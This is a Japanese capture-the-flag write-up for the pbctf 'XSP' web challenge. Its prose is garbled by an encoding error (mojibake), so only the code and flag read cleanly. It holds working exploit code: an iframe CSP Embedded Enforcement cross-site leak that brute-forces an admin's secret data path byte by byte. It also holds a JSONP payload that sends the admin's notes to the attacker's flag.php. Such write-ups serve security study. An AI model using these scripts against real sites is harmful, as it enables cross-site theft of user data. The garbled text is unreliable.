
ã¨ã„ã†ã‚ˆã†ãªæµã‚Œã§ `iframe` è¦ç´ ã«ã‚ˆã‚‹åŸ‹ã‚è¾¼ã¿å…ˆã®ãƒšãƒ¼ã‚¸ã«ãƒãƒªã‚·ãƒ¼ã‚’å¼·åˆ¶ã™ã‚‹ã“ã¨ãŒã§ãã‚‹ã¨ã„ã†ã‚‚ã®ã§ã™ã€‚ãªãŠã€ã‚‚ã—åŸ‹ã‚è¾¼ã¾ã‚ŒãŸ Web ãƒšãƒ¼ã‚¸ãŒè¦æ±‚ã•ã‚ŒãŸãƒãƒªã‚·ãƒ¼ã‚’å—ã‘å…¥ã‚Œãªã„ (ä¾‹ãˆã°ã€ã‚ˆã‚Šç·©ã„ãƒãƒªã‚·ãƒ¼ã‚’è¿”ã™) å ´åˆã«ã¯èª­ã¿è¾¼ã¿ãŒãƒ–ãƒ­ãƒƒã‚¯ã•ã‚Œã¾ã™ã€‚

CSP Embedded Enforcement ã¯ã€Google Chrome ã§æ—¢ã«å®Ÿè£…ã•ã‚Œã€ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§æœ‰åŠ¹åŒ–ã•ã‚Œã¦ã„ã¾ã™ã€‚`Report Link` ã‹ã‚‰é©å½“ãª URL ã‚’é€ä¿¡ã™ã‚‹ã¨ `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/88.0.4298.0 Safari/537.36` ã¨ã„ã† User-Agent ã‚’æŒã¤ HTTP ãƒªã‚¯ã‚¨ã‚¹ãƒˆãŒæ¥ã¾ã™ã‹ã‚‰ã€admin ã®ç’°å¢ƒã§ã¯æœ‰åŠ¹åŒ–ã•ã‚Œã¦ã„ã‚‹ã¯ãšã§ã™ã€‚

CSP Embedded Enforcement ãŒã“ã®å•é¡Œã§ã® `data_path` ã®ãƒªãƒ¼ã‚¯ã«ä½¿ãˆã‚‹ã‹ã©ã†ã‹è€ƒãˆã¦ã„ãã¾ã—ã‚‡ã†ã€‚

`data_path` ãŒ `/data/f4/71/8b/8/ef/e2/61/33/a2/d0/89/5b/6/53/e7/a3` ã§ã‚ã‚‹å ´åˆã«ã¤ã„ã¦è€ƒãˆã¾ã™ã€‚ä»¥ä¸‹ã®ã‚ˆã†ãª 2 ã¤ã® `iframe` ãŒã‚ã£ãŸå ´åˆã€å‰è€…ã¯èª­ã¿è¾¼ã¿ãŒãƒ–ãƒ­ãƒƒã‚¯ã•ã‚Œã¾ã™ãŒã€å¾Œè€…ã§ã¯æ™®é€šã«èª­ã¿è¾¼ã¾ã‚Œã¾ã™ã€‚

ã“ã‚Œã¯ã€ã„ãšã‚Œã®å ´åˆã§ã‚‚ Web ãƒšãƒ¼ã‚¸ã¯ `default-src 'none'; script-src https://(çœç•¥)/notes.js /data/f4/71/8b/8/ef/e2/61/33/a2/d0/89/5b/6/53/e7/a3` ã¨ã„ã†ãƒãƒªã‚·ãƒ¼ã‚’è¿”ã—ã¾ã™ãŒã€å‰è€…ã®å ´åˆã«ã¯ã€è¦æ±‚ã—ãŸãƒãƒªã‚·ãƒ¼ã§ã¯èª­ã¿è¾¼ã¿ã‚’è¨±å¯ã—ãªã„ `/data/f4/...` ã¨ã„ã†ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã«ã¤ã„ã¦ã‚‚è¨±å¯ã™ã‚‹ã‚ˆã†ãªã‚ˆã‚Šç·©ã„ãƒãƒªã‚·ãƒ¼ã‚’è¿”ã—ãŸã¨åˆ¤æ–­ã•ã‚Œã‚‹ãŸã‚ã§ã™ã€‚

```html
<iframe src="https://(çœç•¥)/notes" csp="default-src 'none'; script-src https://(çœç•¥)/notes.js https://(çœç•¥)/data/f3/"></iframe>
<iframe src="https://(çœç•¥)/notes" csp="default-src 'none'; script-src https://(çœç•¥)/notes.js https://(çœç•¥)/data/f4/"></iframe>
```

Web ãƒšãƒ¼ã‚¸ã®èª­ã¿è¾¼ã¿ãŒãƒ–ãƒ­ãƒƒã‚¯ã•ã‚ŒãŸã‹ã©ã†ã‹ã¯ã€`onload` ã•ã‚ŒãŸå¾Œã«ãã® `iframe` è¦ç´ ã® `src` å±æ€§ã« `#` ã‚’åŠ ãˆã€ãã®å¾Œå†ã³ `onload` ãŒå‘¼ã³å‡ºã•ã‚ŒãŸã‹ã©ã†ã‹ã«ã‚ˆã£ã¦è¦³æ¸¬ã§ãã¾ã™ã€‚

ä¾‹ãˆã°ã€`data_path` ãŒ `/data/38/9e/57/fb/8b/b6/ad/5f/e2/67/eb/7f/8b/29/7f/b6` ã§ã‚ã‚‹å ´åˆã«æ¬¡ã®ã‚ˆã†ãª HTML ã‚’é–‹ãã¨ã€

```html
<body>
<script>
for (let i = 0x38 - 2; i <= 0x38 + 2; i++) {
  const iframe = document.createElement('iframe');
  iframe.onload = () => {
    iframe.onload = () => {
      console.log(i.toString(16));
    };
    iframe.src += '#';
  };
  iframe.csp = `default-src 'none'; script-src https://(çœç•¥)/notes.js https://(çœç•¥)/data/${i.toString(16)}/`;
  iframe.src = 'https://(çœç•¥)/notes';
  document.body.appendChild(iframe);
}
</script>
</body>
```

æ¬¡ã®ã‚ˆã†ã« 3 ç•ªç›®ã«èª­ã¿è¾¼ã¾ã‚ŒãŸ (`csp` å±æ€§ãŒ `default-src 'none'; script-src https://(çœç•¥)/notes.js https://(çœç•¥)/data/38/` ã§ã‚ã‚‹ã‚‚ã®) ã®ã¿èª­ã¿è¾¼ã¿ãŒãƒ–ãƒ­ãƒƒã‚¯ã•ã‚Œãšã€DevTools ã® Console æ¬„ã§ã‚‚ `38` ã ã‘ãŒ `console.log` ã«ã‚ˆã£ã¦è¡¨ç¤ºã•ã‚Œã¦ã„ãªã„ã“ã¨ãŒã‚ã‹ã‚Šã¾ã™ã€‚

![3 ç•ªç›®ã® iframe ã ã‘èª­ã¿è¾¼ã‚ã¦ã„ã‚‹](../images/2020-12-10_xsp3.png)

ã“ã‚Œã‚’åˆ©ç”¨ã™ã‚Œã°ã€ã‚¹ãƒ©ãƒƒã‚·ãƒ¥åŒºåˆ‡ã‚Šã®å„ãƒ‘ãƒ¼ãƒˆã‚’ç·å½“ãŸã‚Šã—ã¦ã„ã‘ã° `data_path` ã‚’ç‰¹å®šã™ã‚‹ã“ã¨ãŒã§ããã†ã§ã™ã€‚

ç°¡å˜ã« `data_path` ã‚’ç‰¹å®šã§ãã‚‹ã‚ˆã†ã«ã€ä»¥ä¸‹ã®ã‚ˆã†ãªã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’æ›¸ãã¾ã—ãŸã€‚

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Document</title>
</head>
<body>
<iframe src="wait.php"></iframe>
<script>
const [start, known] = [0x20, '6f/']

/////

const iframes = [];
for (let i = 0; i < 16; i++) {
  const iframe = document.createElement('iframe');
  iframes.push(iframe);
  document.body.appendChild(iframe);
}

const check = base => new Promise((resolve, reject) => {
  let result = new Array(16);
  for (let i = 0; i < 16; i++) {
    result.fill(true);

    const iframe = iframes[i];
    const j = i + base;
    const s = j.toString(16);
    iframe.csp = `default-src 'none'; script-src https://(çœç•¥)/notes.js https://(çœç•¥)/data/${known}${s}/`;
    iframe.src = 'https://(çœç•¥)/notes';
    iframe.onload = () => {
      iframe.onload = () => {
        result[i] = false;
      };
      iframe.src += '#';
    };
  }

  setTimeout(() => {
    for (let i = 0; i < 16; i++) {
      if (result[i]) {
        resolve((i + base).toString(16));
      }
    }
    resolve(null);
  }, 5000);
});

(async () => {
  for (let i = start; i < 0x100; i += 0x10) {
    (new Image).src = 'start.php?' + i.toString(16);
    const result = await check(i);
    if (result !== null) {
      (new Image).src = 'report.php?' + result;
    }
  }
})();
</script>
</body>
</html>
```

ã“ã®å ´åˆã¯ `data_path` ã‚’ `/` ã§åŒºåˆ‡ã£ãŸ 2 ç•ªç›®ã®éƒ¨åˆ†ã«ã¤ã„ã¦ç·å½“ãŸã‚Šã§ç¢ºèªã—ã¦ã„ã¾ã™ã€‚`Report Link` ã§ã“ã® HTML ã‚’è¿”ã™ URL ã‚’å ±å‘Šã™ã‚‹ã¨ã€æ¬¡ã®ç”»åƒã®ã‚ˆã†ã« admin ã‹ã‚‰ HTTP ãƒªã‚¯ã‚¨ã‚¹ãƒˆãŒé£›ã‚“ã§ãã¾ã™ã€‚`2d` ãŒæ­£è§£ãªã‚ˆã†ã§ã™ã€‚

![ã“ã®å ´åˆã¯ 2d ãŒæ­£è§£](../images/2020-12-10_xsp4.png)

ã¡ã¾ã¡ã¾ç¹°ã‚Šè¿”ã—ã¦ã„ãã¨ã€`/data/6f/2d/ab/fd/c5/a1/96/6b/b6/2c/fc/51/42/67/45/8` ãŒ admin ã® `data_path` ã§ã‚ã‚‹ã“ã¨ãŒã‚ã‹ã‚Šã¾ã™ã€‚

æœ€çµ‚çš„ã«ã€ä»¥ä¸‹ã®ã‚ˆã†ã« JSONP ã‚’ä½¿ã†ã“ã¨ã§ãƒ•ãƒ©ã‚°ãŒå¾—ã‚‰ã‚Œã¾ã—ãŸã€‚

```html
<script>
	function notes_callback(obj) {
		console.log(obj);
		(new Image).src = 'flag.php?' + encodeURIComponent(JSON.stringify(obj))
	}
</script>
<script src="https://(çœç•¥)/data/6f/2d/ab/fd/c5/a1/96/6b/b6/2c/fc/51/42/67/45/8"></script>
```

```
pbctf{x5_l34k5_1N_C5P_1s_4ls0_p0sS1bl3}
```